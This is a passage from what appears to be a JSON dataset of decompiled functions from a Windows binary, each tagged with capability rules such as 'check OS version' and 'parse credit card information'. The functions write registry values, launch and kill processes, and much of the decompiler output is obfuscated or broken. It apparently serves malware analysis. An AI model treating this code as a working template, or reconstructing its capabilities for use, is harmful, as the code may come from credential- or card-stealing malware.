0x4224b4;\n    fcn.00403890();\n    fcn.00403890(0x4224b4, 0x16, 0x4220b0, 0x18);\n    uStack16 = 0x25;\n    uStack14 = 0;\n    uStack20 = 0x20c8;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    fcn.00403890();\n    uStack16 = 10;\n    uStack14 = 0;\n    uStack20 = 0x20f0;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    fcn.00403890();\n    uStack16 = 0xc;\n    uStack14 = 0;\n    uStack20 = 0x20fc;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    fcn.00403890();\n    iVar9 = extraout_CH_00 - 1 << 8;\n    while( true ) {\n        bVar15 = iVar9 >> 8 < 5;\n        uStack16 = 0xd;\n        uStack14 = 0;\n        uStack20 = 0x2108;\n        uStack18 = 0x42;\n        uStack24 = 0x16;\n        uStack22 = 0;\n        puStack28 = 0x4224b4;\n        puVar6 = unaff_ESI;\n        iVar5 = unaff_EBP;\n        fcn.00403890();\n        if ((bVar15) || (!bVar15)) {\n            iVar5 = 0x422118;\n            puVar6 = 0x16;\n        }\n        puVar11 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n        iVar9 = unaff_EBP + 0x68066a76;\n        *extraout_ECX = *extraout_ECX - extraout_AH;\n        puVar4 = extraout_EDX + 0x17;\n        uVar12 = extraout_ECX >> 8;\n        bVar15 = CARRY1(*puVar4, uVar12);\n        cVar17 = SCARRY1(*puVar4, uVar12);\n        *puVar4 = *puVar4 + uVar12;\n        cVar16 = *puVar4 < '\\0';\n        uVar13 = *puVar4 == 0;\n        fcn.00403890(0x4224b4);\n        if ((!bVar15) && (bVar15)) {\n            piVar2 = unaff_EBP + 0x68066adf + extraout_EDX_00 * 4;\n            iVar3 = iVar9 + *piVar2;\n            cVar17 = SCARRY4(iVar9, *piVar2) != SCARRY4(iVar3, bVar15);\n            iVar9 = iVar3 + bVar15;\n            cVar16 = iVar9 < 0;\n            uVar13 = iVar9 == 0;\n        }\n        unaff_EDI = 0x4224b4;\n        uVar12 = fcn.00403890();\n        if ((uVar13 || cVar17 != cVar16) || (!uVar13 && cVar17 == cVar16)) break;\n        in_AF = 9 < (uVar12 & 0xf) | in_AF;\n        iVar9 = extraout_ECX_00;\n        unaff_ESI = puVar6;\n        unaff_EBP = iVar5;\n        if (extraout_ECX_00 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    fcn.00403890(0x4224b4, 0x16, 0x422128, 0xd);\n    uStack16 = iVar9;\n    cVar17 = '\\0';\n    cVar16 = (uStack16 & extraout_CX_00) < 0;\n    bVar15 = (uStack16 & extraout_CX_00) == 0;\n    uStack16 = 0x19;\n    uStack14 = 0;\n    uStack20 = 0x2138;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    uVar18 = fcn.00403890();\n    if ((bVar15 || cVar17 != cVar16) || (!bVar15 && cVar17 == cVar16)) {\n        puVar6 = 0x16;\n    }\n    uVar10 = iVar9 + 1;\n    puVar4 = uVar18 + 0x6a39da56;\n    *puVar4 = *puVar4 ^ extraout_CX_01;\n    pcVar1 = (uVar18 >> 0x20) + 0x16;\n    *pcVar1 = *pcVar1 + (extraout_CX_01 >> 8);\n    fcn.00403890(0x4224b4, puVar6);\n    uStack16 = 0xe;\n    uStack14 = 0;\n    uStack20 = 0x2164;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    fcn.00403890();\n    uStack16 = 0xb;\n    uStack14 = 0;\n    uStack20 = 0x2174;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    fcn.00403890();\n    uStack16 = 0xb;\n    uStack14 = 0;\n    uStack20 = 0x2180;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    iVar5 = fcn.00403890();\n    bVar15 = (POPCOUNT(iVar5 - extraout_ECX_01 & 0xff) & 1U) == 0;\n    uStack16 = 0xb;\n    uStack14 = 0;\n    uStack20 = 0x218c;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    uVar21 = 0x401a6f;\n    uVar18 = fcn.00403890();\n    puVar8 = uVar18 >> 0x20;\n    uVar7 = uVar18;\n    if ((bVar15) || (uVar21 = uVar21 & 0xffff | unaff_ESI << 0x10,  !bVar15)) {\n        uVar21 = 10;\n        unaff_EBP = 0x422198;\n    }\n    else {\n        out(*unaff_ESI, uVar18 >> 0x20);\n        do {\n            cVar16 = uVar7 >> 8;\n            in_AF = 9 < (uVar7 & 0xf) | in_AF;\n            uVar7 = CONCAT31(CONCAT21(uVar7 >> 0x10, cVar16 - in_AF), -in_AF);\n        } while (in_AF || cVar16 == *puVar8);\n        piVar2 = puVar11 + puVar8 * 2;\n        *piVar2 = (*piVar2 + 0x7b) - in_AF;\n        *(extraout_ECX_02 + 0x6a) = uVar7;\n        *puVar8 = *puVar8 & uVar7;\n    }\n    puVar6 = fcn.00403890(0x4224b4, 0x16, unaff_EBP, uVar21);\n    bVar15 = puVar11 == puVar6;\n    uStack16 = 0xc;\n    uStack14 = 0;\n    uStack20 = 0x21a4;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    uVar18 = fcn.00403890();\n    uVar7 = uVar18;\n    if ((bVar15) || (!bVar15)) {\n        puVar11 = 0xe;\ncode_r0x00401acf:\n        puVar4 = (uVar18 >> 0x20) + 0xe;\n        *puVar4 = *puVar4 ^ extraout_CH_01;\n        uVar20 = 0x4221b0;\n        uVar19 = 0x16;\n        fcn.00403890(0x4224b4, 0x16, 0x4221b0, puVar11);\n        uStack16 = 0x11;\n        uStack14 = 0;\n        uStack20 = 0x21c0;\n        uStack18 = 0x42;\n        uStack24 = 0x16;\n        uStack22 = 0;\n        puStack28 = 0x4224b4;\n        uVar7 = fcn.00403890();\n        bVar15 = false;\n        bVar14 = ((uVar7 ^ 0x687c) & 0x3000) == 0;\n        uStack16 = 0x13;\n        uStack14 = 0;\n        uStack20 = 0x21d4;\n        uStack18 = 0x42;\n        uStack24 = 0x16;\n        uStack22 = 0;\n        puStack28 = 0x4224b4;\n        uVar7 = fcn.00403890();\n        if ((!bVar14) && (bVar14)) {\n            uVar10 = iVar9 + 2;\n            bVar14 = (POPCOUNT(uVar10 & 0xff) & 1U) == 0;\n            if (!bVar15 && uVar10 != 0) goto code_r0x00401b45;\n            uVar18 = func_0xe21f885d();\n            puVar4 = uVar18 >> 0x20;\n            if (bVar14) {\n                LOCK();\n                *puVar4 = *puVar4 ^ uVar18 >> 8;\n                puVar4[0x17] = puVar4[0x17] + extraout_CH_02;\n                goto code_r0x00401ba3;\n            }\n            puStack28 = puVar4 + 1;\n            puVar4 = (uVar18 & 0xffff0000 | CONCAT11(0x24, uVar18) & 0xffffff00 | uVar18 + extraout_CH_02) + 0x66;\n            *puVar4 = *puVar4 & puStack28;\n        }\n    }\n    else {\n        uVar19 = in(uVar18 >> 0x20);\n        *puVar11 = uVar19;\n        if (0 < &stack0xffffffe4) goto code_r0x00401acf;\n        *(iVar9 + 0x77) = *(iVar9 + 0x77) + uVar18;\ncode_r0x00401b45:\n        in_AF = 9 < (uVar7 & 0xf) | in_AF;\n        piVar2 = (uVar7 & 0xffff0000 | CONCAT11((uVar7 >> 8) + in_AF, uVar7 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar2 = *piVar2 - uVar10;\n    }\n    iVar9 = fcn.00403890(0x4224b4, 0x16, 0x4221e8, 0x14);\n    bVar15 = SCARRY4(iVar9, 1);\n    uStack16 = 0x33;\n    uStack14 = 0;\n    uStack20 = 0x21fc;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    fcn.00403890();\n    if ((!bVar15) && (bVar15)) {\n        *puStack28 = unaff_retaddr;\n        return;\n    }\n    uVar20 = 0x422230;\n    uVar19 = 0x16;\ncode_r0x00401ba3:\n    fcn.00403890(0x4224b4, uVar19, uVar20);\n    uStack16 = 4;\n    uStack14 = 0;\n    uStack20 = 0x223c;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    fcn.00403890();\n    uStack16 = 5;\n    uStack14 = 0;\n    uStack20 = 0x2240;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    fcn.00403890();\n    uStack16 = 6;\n    uStack14 = 0;\n    uStack20 = 0x2248;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    fcn.00403890();\n    fcn.00403890(0x4224b4, 0x16, 0x42227c, 0x2a);\n    uStack16 = 0xb;\n    uStack14 = 0;\n    uStack20 = 0x22a8;\n    uStack18 = 0x42;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    puStack28 = 0x4224b4;\n    fcn.00403890();\n    return;\n}\n",
        "token_count": 4435
    },
    "004024e0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004024e0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_268h;\n    uint var_267h;\n    char var_164h;\n    uint var_163h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    char *var_4ch;\n    char *var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_268h = 0;\n    puVar5 = &var_267h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_164h = '\\0';\n    puVar5 = &var_163h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_8h = 1;\n    var_4h = 0;\n    var_ch = 1;\n    var_10h = arg_ch != 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_164h, 0x4220b0, arg_8h);\n    (*pcVar2)(&var_268h, 0x4220c8, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_44h = &var_8h;\n    var_40h = &var_4h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_164h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_24h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_4ch = &var_164h;\n    var_38h = 0x4220f0;\n    var_34h = 0x4220fc;\n    var_30h = 0x422108;\n    var_2ch = 0x422118;\n    var_28h = 0x422120;\n    var_60h = 2;\n    var_5ch = 1;\n    var_58h = 4;\n    var_54h = 4;\n    var_50h = 4;\n    var_48h = arg_8h;\n    var_3ch = &var_ch;\n    var_20h = ~uVar4 - 1;\n    var_1ch = 4;\n    var_18h = 4;\n    var_14h = 4;\n    if (var_10h < 5) {\n        uVar4 = var_10h * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_268h, *(&var_38h + uVar4), *(&var_60h + uVar4), *(&var_4ch + uVar4), \n                              *(&var_24h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1123
    },
    "00402720": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00402720(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00404e10(0x80000002, 0x4221fc, 0x422248, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "00402df0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool fcn.00402df0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00403330(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4221fc, 0x42223c, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 262
    },
    "004045a0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404667) overlaps instruction at (ram,0x00404666)\n// \n// WARNING: Removing unreachable block (ram,0x00404657)\n// WARNING: Removing unreachable block (ram,0x0040465c)\n// WARNING: Removing unreachable block (ram,0x004046d2)\n// WARNING: Removing unreachable block (ram,0x004046fb)\n// WARNING: Removing unreachable block (ram,0x00404703)\n// WARNING: Removing unreachable block (ram,0x0040473c)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004045a0(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    uint8_t *unaff_EDI;\n    uint *puVar6;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uchar var_260h;\n    uint var_25fh;\n    uchar s;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    fcn.00402050();\n    iVar5 = fcn.00403db0();\n    if (iVar5 != 0) {\n        uVar4 = iVar5;\n        cVar1 = uVar4 - *unaff_EDI;\n        func_0x1018a581((in_NT & 1) * 0x4000 | SBORROW1(uVar4, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                        (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                        ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar4 < *unaff_EDI | (in_ID & 1) * 0x200000 |\n                        (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000);\n        var_260h = 0;\n        puVar6 = &var_25fh;\n        for (iVar5 = extraout_ECX; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        *puVar6 = 0;\n        *(puVar6 + 2) = 0;\n        iVar5 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, &var_260h, 0x26, 0);\n        if (iVar5 != 0) {\n            fcn.004036e0();\n            s = 0;\n            puVar6 = &var_15bh;\n    // WARNING: Bad instruction - Truncating control flow here\n            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            *puVar6 = 0;\n            *(puVar6 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x4223d0, &var_260h, 0x4223b0, 3);\n            pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n            var_14h = 0;\n            do {\n                puVar6 = &var_58h;\n                for (iVar5 = 0x11; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                var_28h._0_2_ = 0;\n                hProcess = 0;\n                var_ch = 0;\n                var_58h = 0x44;\n                lParam = 0;\n                var_2ch = 1;\n                var_4h = 0;\n                iVar5 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &s, 0, 0, 0, 0, 0, 0, &var_58h, &hProcess);\n                if (iVar5 == 0) {\n                    return;\n                }\n                (*pcVar2)(3000);\n                (*_sym.imp.USER32.dll_EnumWindows)(fcn.00404490, lParam);\n                iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hProcess, 1000);\n                if (iVar5 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 1);\n                }\n                pcVar3 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                (*pcVar3)(hProcess);\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1271
    },
    "00401cb0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f01) overlaps instruction at (ram,0x00401f00)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401cb0(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    ushort extraout_CX;\n    ushort extraout_CX_00;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint8_t *extraout_EDX;\n    uint unaff_EBX;\n    uint32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uchar uVar3;\n    char cVar4;\n    char cVar5;\n    uchar uVar6;\n    ulong uVar7;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar uStack48;\n    uchar uStack47;\n    uchar uStack46;\n    uint uStack45;\n    uint uStack41;\n    uint uStack37;\n    uchar uStack33;\n    uchar uStack32;\n    ushort uStack31;\n    uint uStack29;\n    uchar uStack25;\n    ushort uStack24;\n    uchar uStack22;\n    uchar uStack21;\n    uchar uStack20;\n    uchar uStack19;\n    uchar uStack18;\n    uchar uStack17;\n    uchar uStack16;\n    uchar uStack15;\n    uchar uStack14;\n    uchar uStack13;\n    uchar uStack12;\n    ushort uStack11;\n    uchar uStack9;\n    \n    uStack12 = SUB41(unaff_EDI, 0);\n    uStack11 = unaff_EDI >> 8;\n    uStack9 = unaff_EDI >> 0x18;\n    uVar6 = uStack9;\n    uStack16 = 0x11;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0x34;\n    uStack19 = 0x20;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0xcd;\n    uStack31 = 0x401c;\n    uStack29 = 0x4224b400;\n    fcn.00403890();\n    uVar3 = 0;\n    cVar5 = '\\0';\n    cVar4 = (CONCAT11(extraout_CX >> 8 & unaff_EBX >> 8, extraout_CX | unaff_EBX) & unaff_EDI) < 0;\n    uStack16 = 0xf;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0x50;\n    uStack19 = 0x22;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0xf8;\n    uStack31 = 0x401c;\n    uStack29._1_3_ = 0x4224b4;\n    uStack29._0_1_ = 0;\n    cVar1 = fcn.00403890();\n    if ((cVar4) || (!cVar4)) {\n        uStack32 = 0x1a;\n        uStack31 = 0;\n        uStack29._0_1_ = 0;\n        uStack37 = 0x42226000;\n        uStack33 = 0;\n    }\n    else {\n        uVar3 = 0;\n        cVar5 = '\\0';\n        cVar4 = (cVar1 + 0x6aU & *extraout_EDX) < '\\0';\n    }\n    uStack37 = uStack37 & 0xffffff00;\n    uStack41 = 0x1600;\n    uStack48 = 0x19;\n    uStack47 = 0x1d;\n    uStack46 = 0x40;\n    uStack45._1_3_ = 0x4224b4;\n    uStack45._0_1_ = 0;\n    puVar2 = fcn.00403890();\n    if (cVar5 == cVar4) {\n        uStack46 = extraout_CX_00;\n        uStack45._0_1_ = extraout_CX_00 >> 8;\n        if (cVar5 == cVar4) goto code_r0x00401d2e;\n        uVar3 = 0;\n        unaff_ESI = puVar2;\n    }\n    else {\ncode_r0x00401d2e:\n        uStack48 = 10;\n        uStack47 = 0;\n        uStack46 = 0;\n        uStack45._0_1_ = 0;\n        uStack52 = 0x4222b4;\n    }\n    uStack56 = 0x16;\n    uStack60 = 0x4224b4;\n    uStack64 = 0x401d41;\n    uVar7 = fcn.00403890();\n    uStack64 = uVar7 >> 0x20;\n    if ((uVar3) || (!uVar3)) {\n        uStack64 = 0xb;\n        uStack68 = 0x4222c0;\n    }\n    else {\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n        unaff_EBP = unaff_EBP | *(uVar7 + (uVar3 == false) + 0x7c8ecacd);\n    }\n    uStack72 = 0x16;\n    uStack76 = 0x4224b4;\n    fcn.00403890();\n    if ((SCARRY4(&stack0xffffffb4, 0x40)) || (!SCARRY4(&stack0xffffffb4, 0x40))) {\n        uStack16 = 8;\n        uStack15 = 0;\n        uStack14 = 0;\n        uStack13 = 0;\n    }\n    uStack20 = 0xcc;\n    uStack19 = 0x22;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0x9a;\n    uStack31 = 0x401d;\n    uStack29 = 0x4224b400;\n    fcn.00403890();\n    uStack16 = 9;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0xd4;\n    uStack19 = 0x22;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0xb5;\n    uStack31 = 0x401d;\n    uStack29 = 0x4224b400;\n    fcn.00403890();\n    uStack16 = 9;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0xe0;\n    uStack19 = 0x22;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0xe0;\n    uStack31 = 0x401d;\n    uStack29 = 0x4224b400;\n    fcn.00403890();\n    uStack16 = 9;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0xec;\n    uStack19 = 0x22;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0xb;\n    uStack31 = 0x401e;\n    uStack29 = 0x4224b400;\n    fcn.00403890();\n    uStack33 = unaff_EBP >> 0x18;\n    uStack45._1_3_ = unaff_EDI;\n    uStack41 = CONCAT31(unaff_ESI, uVar6);\n    uStack16 = 0xc;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0xf8;\n    uStack19 = 0x22;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0x29;\n    uStack31 = 0x401e;\n    uStack29._1_3_ = 0x4224b4;\n    uStack29._0_1_ = 0;\n    fcn.00403890();\n    uStack32 = 3;\n    uStack31 = 0;\n    uStack29 = uStack29._1_3_ << 8;\n    uStack33 = 0;\n    uStack37 = 0x42230400;\n    uStack41 = 0x1600;\n    uStack48 = 0x4a;\n    uStack47 = 0x1e;\n    uStack46 = 0x40;\n    uStack45 = 0x4224b400;\n    fcn.00403890();\n    uStack16 = 10;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 8;\n    uStack19 = 0x23;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0x6b;\n    uStack31 = 0x401e;\n    uStack29 = 0x4224b400;\n    fcn.00403890();\n    uStack16 = 0x40;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0x14;\n    uStack19 = 0x23;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0x8c;\n    uStack31 = 0x401e;\n    uStack29 = 0x4224b400;\n    fcn.00403890();\n    uStack16 = 0xc;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0x54;\n    uStack19 = 0x23;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 200;\n    uStack31 = 0x401e;\n    uStack29 = 0x4224b400;\n    fcn.00403890();\n    uVar6 = SBORROW4(extraout_ECX, 0x5354);\n    uStack16 = 0xb;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0x60;\n    uStack19 = 0x23;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0xf3;\n    uStack31 = 0x401e;\n    uStack29._1_3_ = 0x4224b4;\n    uStack29._0_1_ = 0;\n    fcn.00403890();\n    if (!uVar6) {\n        uStack32 = extraout_ECX_00;\n        uStack31 = extraout_ECX_00 >> 8;\n        uStack29._0_1_ = extraout_ECX_00 >> 0x18;\n        if (uVar6) {\n            *unaff_EDI = *unaff_ESI;\n            uVar6 = 0;\n            goto code_r0x00401f08;\n        }\n    }\n    uStack32 = 4;\n    uStack31 = 0;\n    uStack29._0_1_ = 0;\n    uStack37 = 0x42236c00;\n    uStack33 = 0;\ncode_r0x00401f08:\n    uStack37 = uStack37 & 0xffffff00;\n    uStack41 = 0x1600;\n    uStack48 = 0x14;\n    uStack47 = 0x1f;\n    uStack46 = 0x40;\n    uStack45._1_3_ = 0x4224b4;\n    uStack45._0_1_ = 0;\n    fcn.00403890();\n    if ((!uVar6) && (uVar6)) {\n        LOCK();\n    }\n    uStack48 = 4;\n    uStack47 = 0;\n    uStack46 = 0;\n    uStack45 = uStack45._1_3_ << 8;\n    uStack52 = 0x422370;\n    uStack56 = 0x16;\n    uStack60 = 0x4224b4;\n    uStack64 = 0x401f4a;\n    fcn.00403890();\n    uStack16 = 0xc;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0x74;\n    uStack19 = 0x23;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0x86;\n    uStack31 = 0x401f;\n    uStack29 = 0x4224b400;\n    fcn.00403890();\n    uStack16 = 4;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0x80;\n    uStack19 = 0x23;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0xb1;\n    uStack31 = 0x401f;\n    uStack29 = 0x4224b400;\n    fcn.00403890();\n    uStack16 = 9;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0x84;\n    uStack19 = 0x23;\n    uStack18 = 0x42;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack25 = 0;\n    uStack32 = 0xe7;\n    uStack31 = 0x401f;\n    uStack29 = 0x4224b400;\n    fcn.00403890();\n    uStack29 = 0x16;\n    uStack33 = 0x90;\n    uStack32 = 0x23;\n    uStack31 = 0x42;\n    uStack37 = 0x16;\n    uStack41 = 0x4224b4;\n    uStack45 = 0x402011;\n    fcn.00403890();\n   